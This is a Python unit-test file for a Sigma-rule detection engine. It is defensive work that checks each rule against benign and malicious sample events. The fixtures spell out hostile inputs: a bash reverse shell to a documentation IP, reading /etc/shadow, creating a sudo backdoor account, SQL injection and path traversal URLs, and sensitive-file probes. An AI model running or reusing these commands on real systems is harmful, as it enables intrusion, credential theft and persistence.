"""Detection-as-Code unit tests: schema validation and TP/TN tests per Sigma rule."""

from __future__ import annotations

import unittest
from datetime import UTC, datetime, timedelta
from pathlib import Path

from detection_engine.models import NormalizedEvent
from detection_engine.sigma_engine import (
    SigmaDetectionEngine,
    load_rule_from_file,
    load_rules_from_dir,
    validate_rule_dict,
)

RULES_DIR = Path(__file__).resolve().parent.parent / "rules"


def _make_event(
    *,
    logsource: dict[str, str],
    fields: dict[str, object],
    offset_seconds: int = 0,
    source_type: str = "test",
) -> NormalizedEvent:
    base = datetime(2026, 11, 20, 14, 0, 0, tzinfo=UTC)
    return NormalizedEvent(
        timestamp=base + timedelta(seconds=offset_seconds),
        source_type=source_type,
        logsource=logsource,
        fields=fields,
        raw=str(fields),
    )


class TestSigmaRuleSuite(unittest.TestCase):
    def test_all_rules_pass_schema_validation(self) -> None:
        rules = load_rules_from_dir(RULES_DIR)
        self.assertEqual(len(rules), 8)
        rule_ids = [r.id for r in rules]
        self.assertEqual(len(rule_ids), len(set(rule_ids)), "Duplicate Sigma rule IDs detected")
        for rule in rules:
            self.assertTrue(rule.mitre_techniques, f"Rule {rule.title} missing MITRE technique tags")
            self.assertTrue(rule.playbook_id, f"Rule {rule.title} missing playbook_id")

    def test_invalid_rule_schema_rejected(self) -> None:
        errors = validate_rule_dict({"title": "Incomplete Rule", "level": "extreme"}, source="bad.yml")
        self.assertGreaterEqual(len(errors), 4)

    def test_ssh_brute_force_tp_and_tn(self) -> None:
        rule = load_rule_from_file(RULES_DIR / "ssh_brute_force.yml")
        engine = SigmaDetectionEngine([rule])

        # True Positive: 5 failures within 5m from same IP
        tp_events = [
            _make_event(
                logsource={"product": "linux", "service": "sshd"},
                fields={"event.action": "ssh_login_failed", "source.ip": "198.51.100.77"},
                offset_seconds=i * 10,
            )
            for i in range(5)
        ]
        self.assertEqual(len(engine.evaluate(tp_events)), 1)

        # True Negative: only 3 failures (below threshold) or spread outside 5m window
        tn_events = [
            _make_event(
                logsource={"product": "linux", "service": "sshd"},
                fields={"event.action": "ssh_login_failed", "source.ip": "10.0.1.10"},
                offset_seconds=i * 200,  # 200s apart -> max 2 in any 5m window
            )
            for i in range(5)
        ]
        self.assertEqual(engine.evaluate(tn_events), [])

    def test_ssh_compromise_correlation_tp_and_tn(self) -> None:
        rule = load_rule_from_file(RULES_DIR / "ssh_compromise_correlation.yml")
        engine = SigmaDetectionEngine([rule])

        # True Positive: 5 failures followed by 1 success from same IP within 10m
        tp_events = [
            _make_event(
                logsource={"product": "linux", "service": "sshd"},
                fields={"event.action": "ssh_login_failed", "source.ip": "198.51.100.77"},
                offset_seconds=i * 5,
            )
            for i in range(5)
        ]
        tp_events.append(
            _make_event(
                logsource={"product": "linux", "service": "sshd"},
                fields={"event.action": "ssh_login_success", "source.ip": "198.51.100.77"},
                offset_seconds=45,
            )
        )
        alerts = engine.evaluate(tp_events)
        self.assertEqual(len(alerts), 1)
        self.assertEqual(alerts[0].severity, "critical")

        # True Negative: success from DIFFERENT IP should NOT correlate
        tn_events = tp_events[:-1] + [
            _make_event(
                logsource={"product": "linux", "service": "sshd"},
                fields={"event.action": "ssh_login_success", "source.ip": "10.0.1.50"},
                offset_seconds=45,
            )
        ]
        self.assertEqual(engine.evaluate(tn_events), [])

    def test_web_sqli_tp_and_tn(self) -> None:
        rule = load_rule_from_file(RULES_DIR / "web_sqli_attempt.yml")
        engine = SigmaDetectionEngine([rule])

        tp = [
            _make_event(
                logsource={"category": "webserver"},
                fields={"url.original": "/api/users?id=1+UNION+SELECT+1,2", "source.ip": "203.0.113.45"},
            ),
            _make_event(
                logsource={"category": "webserver"},
                fields={
                    "url.original": "/api/users?id=1%27%20OR%20%271%27=%271",
                    "source.ip": "203.0.113.45",
                },
            ),
        ]
        alerts = engine.evaluate(tp)
        self.assertEqual(len(alerts), 1)
        self.assertEqual(alerts[0].event_count, 2)

        # True Negative: normal search + filtered /health probe
        tn = [
            _make_event(
                logsource={"category": "webserver"},
                fields={"url.original": "/api/products?sort=price", "source.ip": "10.0.5.12"},
            ),
            _make_event(
                logsource={"category": "webserver"},
                fields={"url.original": "/health?check=union+select", "source.ip": "10.0.0.2"},
            ),
        ]
        self.assertEqual(engine.evaluate(tn), [])

    def test_web_path_traversal_tp_and_tn(self) -> None:
        rule = load_rule_from_file(RULES_DIR / "web_path_traversal.yml")
        engine = SigmaDetectionEngine([rule])

        tp = [
            _make_event(
                logsource={"category": "webserver"},
                fields={"url.original": "/download?file=../../etc/passwd", "source.ip": "203.0.113.45"},
            )
        ]
        self.assertEqual(len(engine.evaluate(tp)), 1)

        tn = [
            _make_event(
                logsource={"category": "webserver"},
                fields={"url.original": "/docs/getting-started", "source.ip": "10.0.5.12"},
            )
        ]
        self.assertEqual(engine.evaluate(tn), [])

    def test_web_sensitive_file_scan_tp_and_tn(self) -> None:
        rule = load_rule_from_file(RULES_DIR / "web_sensitive_file_scan.yml")
        engine = SigmaDetectionEngine([rule])

        tp = [
            _make_event(
                logsource={"category": "webserver"},
                fields={"url.original": path, "source.ip": "203.0.113.45"},
                offset_seconds=i * 5,
            )
            for i, path in enumerate(["/.env", "/.git/config", "/backup.sql"])
        ]
        self.assertEqual(len(engine.evaluate(tp)), 1)

        # True Negative: single accidental 404 probe below threshold of 3
        tn = tp[:2]
        self.assertEqual(engine.evaluate(tn), [])

    def test_linux_reverse_shell_tp_and_tn(self) -> None:
        rule = load_rule_from_file(RULES_DIR / "linux_reverse_shell.yml")
        engine = SigmaDetectionEngine([rule])

        tp = [
            _make_event(
                logsource={"product": "linux", "category": "process_creation"},
                fields={
                    "process.command_line": "bash -i >& /dev/tcp/192.0.2.99/4444 0>&1",
                    "user.name": "deploy",
                },
            )
        ]
        self.assertEqual(len(engine.evaluate(tp)), 1)

        tn = [
            _make_event(
                logsource={"product": "linux", "category": "process_creation"},
                fields={
                    "process.command_line": "curl -fsSL https://get.docker.com | sh",
                    "user.name": "root",
                },
            ),
            _make_event(
                logsource={"product": "linux", "category": "process_creation"},
                fields={"process.command_line": "systemctl status nginx", "user.name": "ci-runner"},
            ),
        ]
        self.assertEqual(engine.evaluate(tn), [])

    def test_linux_credential_access_tp_and_tn(self) -> None:
        rule = load_rule_from_file(RULES_DIR / "linux_credential_access.yml")
        engine = SigmaDetectionEngine([rule])

        tp = [
            _make_event(
                logsource={"product": "linux", "category": "process_creation"},
                fields={
                    "process.name": "cat",
                    "process.command_line": "cat /etc/shadow",
                    "user.name": "deploy",
                },
            )
        ]
        self.assertEqual(len(engine.evaluate(tp)), 1)

        # True Negative: authorized backup_agent account excluded by filter_legit_backup
        tn = [
            _make_event(
                logsource={"product": "linux", "category": "process_creation"},
                fields={
                    "process.name": "tar",
                    "process.command_line": "tar -czf /var/backups/etc.tgz /etc/shadow",
                    "user.name": "backup_agent",
                },
            )
        ]
        self.assertEqual(engine.evaluate(tn), [])

    def test_linux_backdoor_user_tp_and_tn(self) -> None:
        rule = load_rule_from_file(RULES_DIR / "linux_backdoor_user.yml")
        engine = SigmaDetectionEngine([rule])

        tp = [
            _make_event(
                logsource={"product": "linux", "category": "process_creation"},
                fields={
                    "process.command_line": (
                        "useradd -m svc_backup_tmp && usermod -aG sudo svc_backup_tmp"
                    ),
                    "user.name": "root",
                },
            )
        ]
        self.assertEqual(len(engine.evaluate(tp)), 1)

        # True Negative: ansible_provisioner excluded by filter_provisioning
        tn = [
            _make_event(
                logsource={"product": "linux", "category": "process_creation"},
                fields={
                    "process.command_line": "useradd -m dev_intern",
                    "user.name": "ansible_provisioner",
                },
            )
        ]
        self.assertEqual(engine.evaluate(tn), [])


if __name__ == "__main__":
    unittest.main()
